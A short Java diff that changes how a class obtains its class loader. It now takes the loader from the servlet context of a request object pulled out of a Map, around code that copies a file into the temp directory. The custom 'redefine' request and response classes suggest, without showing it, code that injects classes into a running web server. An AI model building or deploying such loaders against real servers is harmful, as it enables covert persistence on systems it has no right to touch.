@@ -1,5 +1,6 @@
 package com.sf.sl;
 
+import com.sf.redefine.MyRequest;
 import com.sf.redefine.MyResponse;
 import com.sf.redefine.MyServletOutputStream;
 
@@ -37,7 +38,6 @@ public class C {
                 java.util.Map objMap = (java.util.Map)obj;
                 Object request = objMap.get("request");
                 Object response = objMap.get("response");
-                ClassLoader loader = C.class.getClassLoader();
                 String tmpdir = System.getProperty("java.io.tmpdir");
                 boolean bool = System.getProperty("os.name").toLowerCase().startsWith("windows");
                 java.io.File source;
@@ -54,6 +54,7 @@ public class C {
                 }
 
                 try {
+                    ClassLoader loader = MyRequest.getServletContext(request).getClass().getClassLoader();
                     copyFileUsingFileStreams(source,dest);
                     boolean exists = dest.exists();
                     if (exists) {
